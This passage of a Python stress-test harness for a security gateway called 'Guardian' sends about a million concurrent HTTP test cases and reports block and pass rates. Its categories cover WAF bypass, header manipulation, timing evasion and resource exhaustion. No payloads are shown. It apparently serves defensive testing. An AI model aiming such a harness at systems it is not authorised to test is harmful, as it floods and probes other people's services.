        conn.request(case["method"], case["path"], body=data, headers=headers)
        resp = conn.getresponse()
        resp.read()
        latency_ms = (time.perf_counter() - t0) * 1000
        status = resp.status
        conn.close()
        return (case["category"], case["subcategory"], status, round(latency_ms, 3))
    except Exception as e:
        return (case["category"], case["subcategory"], -1, 0)


def run_batch(batch_num, batch_size, real_token, concurrency):
    RESULTS_DIR.mkdir(exist_ok=True)
    result_file = RESULTS_DIR / f"batch_{batch_num:04d}.jsonl"

    start = (batch_num - 1) * batch_size
    end = start + batch_size
    cases = []
    with open(PLAN_FILE) as f:
        for i, line in enumerate(f):
            if i >= end:
                break
            if i >= start:
                cases.append(json.loads(line))

    if not cases:
        print(f"Batch {batch_num}: no cases (past end of plan)")
        return

    total_lines = sum(1 for _ in open(PLAN_FILE))
    total_batches = math.ceil(total_lines / batch_size)
    print(f"Batch {batch_num}/{total_batches}: {len(cases):,} cases, concurrency={concurrency}")

    results = []
    t_start = time.time()
    done = 0

    with ThreadPoolExecutor(max_workers=concurrency) as pool:
        futures = {pool.submit(send_request, c, real_token): c for c in cases}
        for future in as_completed(futures):
            result = future.result()
            results.append(result)
            done += 1
            if done % 1000 == 0:
                elapsed = time.time() - t_start
                rps = done / elapsed if elapsed > 0 else 0
                print(f"  {done:>7,}/{len(cases):,}  ({rps:.0f} req/s)", end="\r")

    elapsed = time.time() - t_start
    rps = len(cases) / elapsed if elapsed > 0 else 0

    with open(result_file, "w") as f:
        for r in results:
            f.write(json.dumps({"cat": r[0], "sub": r[1], "status": r[2], "ms": r[3]},
                               separators=(",", ":")) + "\n")

    status_counts = Counter(r[2] for r in results)
    latencies = [r[3] for r in results if r[3] > 0]

    print(f"\nBatch {batch_num} done: {len(cases):,} in {elapsed:.1f}s ({rps:.0f} req/s)")
    print(f"  Status: {dict(sorted(status_counts.items()))}")
    if latencies:
        print(f"  Latency: p50={st.median(latencies):.1f}ms  "
              f"p99={sorted(latencies)[int(len(latencies)*0.99)]:.1f}ms")
    print(f"  Saved: {result_file}")


def run_all(batch_size, real_token, concurrency):
    total = sum(1 for _ in open(PLAN_FILE))
    total_batches = math.ceil(total / batch_size)
    print(f"Running all {total_batches} batches ({total:,} total)\n")
    for b in range(1, total_batches + 1):
        # Check load
        try:
            with open("/proc/loadavg") as f:
                load = float(f.read().split()[0])
            while load >= 8:
                print(f"  [Load={load:.1f}] Waiting 30s...")
                time.sleep(30)
                with open("/proc/loadavg") as f:
                    load = float(f.read().split()[0])
        except FileNotFoundError:
            pass

        run_batch(b, batch_size, real_token, concurrency)
        if b < total_batches:
            time.sleep(10)


def report():
    if not RESULTS_DIR.exists():
        print("No results yet.")
        return

    all_results = []
    for f in sorted(RESULTS_DIR.glob("batch_*.jsonl")):
        with open(f) as fh:
            for line in fh:
                all_results.append(json.loads(line))

    if not all_results:
        print("No results found.")
        return

    print(f"=== HARD-MODE REPORT ({len(all_results):,} requests) ===\n")

    cats = defaultdict(lambda: {"total": 0, "status": Counter(), "latencies": []})
    for r in all_results:
        c = cats[r["cat"]]
        c["total"] += 1
        c["status"][r["status"]] += 1
        if r["ms"] > 0:
            c["latencies"].append(r["ms"])

    print(f"{'Category':<30} {'Total':>8} {'200':>7} {'401':>7} {'403':>7} {'404':>7} {'429':>7} {'Err':>7}  {'p50ms':>7} {'p99ms':>7}")
    print("-" * 115)

    for cat in sorted(cats.keys()):
        c = cats[cat]
        sc = c["status"]
        err = sum(v for k, v in sc.items() if k not in (200, 202, 401, 403, 404, 429))
        lat = sorted(c["latencies"]) if c["latencies"] else [0]
        p50 = lat[len(lat) // 2]
        p99 = lat[min(int(len(lat) * 0.99), len(lat) - 1)]
        print(f"{cat:<30} {c['total']:>8,} {sc[200]+sc.get(202,0):>7,} {sc[401]:>7,} {sc[403]:>7,} "
              f"{sc[404]:>7,} {sc[429]:>7,} {err:>7,}  {p50:>7.1f} {p99:>7.1f}")

    total_status = Counter(r["status"] for r in all_results)
    all_lat = sorted(r["ms"] for r in all_results if r["ms"] > 0)
    print("-" * 115)
    ok = total_status.get(200, 0) + total_status.get(202, 0)
    print(f"{'TOTAL':<30} {len(all_results):>8,} {ok:>7,} {total_status[401]:>7,} "
          f"{total_status[403]:>7,} {total_status[404]:>7,} {total_status[429]:>7,}")
    if all_lat:
        print(f"\nLatency: p50={all_lat[len(all_lat)//2]:.1f}ms  "
              f"p95={all_lat[int(len(all_lat)*0.95)]:.1f}ms  "
              f"p99={all_lat[int(len(all_lat)*0.99)]:.1f}ms  "
              f"max={all_lat[-1]:.1f}ms")

    # Subcategory detail
    print(f"\n{'Subcategory':<40} {'Total':>8} {'Block%':>7} {'Pass%':>7}")
    print("-" * 65)
    subs = defaultdict(lambda: {"total": 0, "blocked": 0, "passed": 0})
    for r in all_results:
        s = subs[f"{r['cat']}/{r['sub']}"]
        s["total"] += 1
        if r["status"] in (403, 429):
            s["blocked"] += 1
        elif r["status"] in (200, 202):
            s["passed"] += 1
    for sub in sorted(subs.keys()):
        s = subs[sub]
        bpct = (s["blocked"] / s["total"] * 100) if s["total"] else 0
        ppct = (s["passed"] / s["total"] * 100) if s["total"] else 0
        print(f"{sub:<40} {s['total']:>8,} {bpct:>6.1f}% {ppct:>6.1f}%")

    report_file = RESULTS_DIR / "summary.json"
    summary = {
        "total_requests": len(all_results),
        "status_distribution": {str(k): v for k, v in sorted(total_status.items())},
        "per_category": {
            cat: {"total": c["total"],
                  "status": {str(k): v for k, v in sorted(c["status"].items())},
                  "p50_ms": sorted(c["latencies"])[len(c["latencies"])//2] if c["latencies"] else 0,
                  "p99_ms": sorted(c["latencies"])[min(int(len(c["latencies"])*0.99),
                            len(c["latencies"])-1)] if c["latencies"] else 0}
            for cat, c in cats.items()
        },
    }
    with open(report_file, "w") as f:
        json.dump(summary, f, indent=2)
    print(f"\nSaved: {report_file}")


def set_endpoint(host, port):
    global HOST, PORT
    HOST = host
    PORT = port


def main():
    parser = argparse.ArgumentParser(description="Guardian hard-mode stress harness")
    sub = parser.add_subparsers(dest="cmd")

    sub.add_parser("generate", help="Generate hard-mode test plan")

    run_p = sub.add_parser("run", help="Execute batches")
    run_p.add_argument("--batch", type=int)
    run_p.add_argument("--all", action="store_true")
    run_p.add_argument("--batch-size", type=int, default=BATCH_SIZE)
    run_p.add_argument("--token", required=True)
    run_p.add_argument("--concurrency", type=int, default=CONCURRENCY)
    run_p.add_argument("--host", default=HOST)
    run_p.add_argument("--port", type=int, default=PORT)

    sub.add_parser("report", help="Show results")

    args = parser.parse_args()

    if args.cmd == "generate":
        generate()
    elif args.cmd == "run":
        set_endpoint(args.host, args.port)
        if args.all:
            run_all(args.batch_size, args.token, args.concurrency)
        elif args.batch:
            run_batch(args.batch, args.batch_size, args.token, args.concurrency)
        else:
            parser.error("Specify --batch N or --all")
    elif args.cmd == "report":
        report()
    else:
        parser.print_help()


def generate():
    print("Generating hard-mode test cases...")
    random.seed(2026)

    generators = [
        ("H1_waf_bypass",          gen_waf_bypass,            100_000),
        ("H2_protocol_abuse",      gen_protocol_abuse,        100_000),
        ("H3_header_manipulation", gen_header_manipulation,    80_000),
        ("H4_behavioral_mimicry",  gen_behavioral_mimicry,    100_000),
        ("H5_timing_evasion",      gen_timing_evasion,         80_000),
        ("H6_resource_exhaustion", gen_resource_exhaustion,    60_000),
        ("H7_advanced_recon",      gen_advanced_recon,         80_000),
        ("H8_ipv6_advanced",       gen_ipv6_advanced,          50_000),
        ("H9_fp_stress",           gen_fp_stress,             100_000),
        ("H10_campaign",           gen_combined_campaign,     250_000),
    ]

    total = 0
    with open(PLAN_FILE, "w") as f:
        for name, gen_fn, count in generators:
            t0 = time.time()
            cases = gen_fn(count)
            for case in cases:
                f.write(json.dumps(case, separators=(",", ":"), ensure_ascii=False) + "\n")
            elapsed = time.time() - t0
            print(f"  {name}: {len(cases):>8,} cases ({elapsed:.1f}s)")
            total += len(cases)

    size_mb = PLAN_FILE.stat().st_size / (1024 * 1024)
    print(f"\nTotal: {total:,} cases -> {PLAN_FILE.name} ({size_mb:.1f} MB)")
    print(f"Batches of {BATCH_SIZE:,}: {math.ceil(total / BATCH_SIZE)}")
    return total


if __name__ == "__main__":
    main()
